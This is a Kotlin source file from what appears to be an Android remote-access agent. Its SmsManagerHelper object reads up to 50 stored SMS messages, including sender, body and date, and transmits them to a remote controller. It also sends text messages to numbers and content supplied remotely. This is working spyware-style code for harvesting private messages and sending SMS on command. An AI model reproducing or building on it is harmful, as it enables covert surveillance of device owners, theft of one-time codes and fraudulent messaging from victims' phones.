package com.kero.remoteagent

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.telephony.SmsManager
import androidx.core.app.ActivityCompat
import org.json.JSONArray
import org.json.JSONObject

object SmsManagerHelper {

    fun getMessages(limit: Int = 50) {
        try {
            val context = AppContextHolder.context

            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                RemoteConnection.sendJson(
                    JSONObject()
                        .put("type", "sms_error")
                        .put("message", "لم يتم منح إذن قراءة الرسائل على الهاتف")
                )
                return
            }

            val projection = arrayOf(
                "address",
                "body",
                "date",
                "type"
            )

            val messagesArray = JSONArray()
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/"),
                projection,
                null,
                null,
                "date DESC"
            )

            cursor?.use {
                val addressCol = it.getColumnIndexOrThrow("address")
                val bodyCol = it.getColumnIndexOrThrow("body")
                val dateCol = it.getColumnIndexOrThrow("date")
                val typeCol = it.getColumnIndexOrThrow("type")

                var count = 0
                while (count < limit && it.moveToNext()) {
                    messagesArray.put(
                        JSONObject()
                            .put("address", it.getString(addressCol) ?: "")
                            .put("body", it.getString(bodyCol) ?: "")
                            .put("date", it.getLong(dateCol))
                            .put(
                                "type",
                                when (it.getInt(typeCol)) {
                                    1 -> "inbox"
                                    2 -> "sent"
                                    3 -> "draft"
                                    else -> "other"
                                }
                            )
                    )
                    count++
                }
            }

            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "sms_list")
                    .put("messages", messagesArray)
            )
        } catch (e: Exception) {
            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "sms_error")
                    .put("message", e.message ?: "تعذر قراءة الرسائل")
            )
        }
    }

    fun sendMessage(phoneNumber: String, message: String) {
        try {
            val context = AppContextHolder.context
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                RemoteConnection.sendJson(JSONObject().apply {
                    put("type", "sms_send_error")
                    put("message", "SEND_SMS permission not granted")
                })
                return
            }
            
            if (phoneNumber.isBlank() || message.isBlank()) {
                RemoteConnection.sendJson(JSONObject().apply {
                    put("type", "sms_send_error")
                    put("message", "Phone number or message is empty")
                })
                return
            }
            
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            if (parts.size == 1) {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            } else {
                smsManager.sendMultipartTextMessage(
                    phoneNumber,
                    null,
                    parts,
                    null,
                    null
                )
            }

            ActivityLogger.log("SMS send requested to $phoneNumber")
            
            RemoteConnection.sendJson(JSONObject().apply {
                put("type", "sms_sent")
                put("to", phoneNumber)
                put("status", "success")
            })
        } catch (e: Exception) {
            e.printStackTrace()
            RemoteConnection.sendJson(JSONObject().apply {
                put("type", "sms_send_error")
                put("message", e.message ?: "Unknown error")
            })
        }
    }
}